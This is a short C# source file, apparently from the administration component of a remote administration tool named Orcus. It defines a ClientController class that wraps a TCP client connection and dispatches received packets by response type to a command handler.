using System;
using Orcus.Shared.Connection;
using System.Net.Sockets;
using Orcus.Shared.Communication;
using System.Linq;

namespace Orcus.Administration.App
{
	public class ClientController : IDisposable
	{
		public ClientController(LightClientInformationApp clientInformation, TcpClient client, Sender sender)
		{
			Commander = new Commander(clientInformation, client, sender);
			Client = clientInformation;
		}

		public void Dispose()
		{
			if (Disconnected != null)
				Disconnected.Invoke (this, EventArgs.Empty);
		}

		public event EventHandler Disconnected;

		public Commander Commander { get; private set; }
		public LightClientInformationApp Client { get; private set; }

		public void PackageReceived(byte parameter, byte[] data)
		{
			switch ((ResponseType)parameter) {
			case ResponseType.CommandResponse:
				if (data.Length < 2) {
					return;
				}
				Commander.Receive (BitConverter.ToUInt32 (data, 0), data.Skip (4).ToArray ());
				break;
			case ResponseType.CommandNotFound:
				break;
			case ResponseType.CommandError:
				break;
			default:
				throw new ArgumentOutOfRangeException ();
			}
		}
	}
}

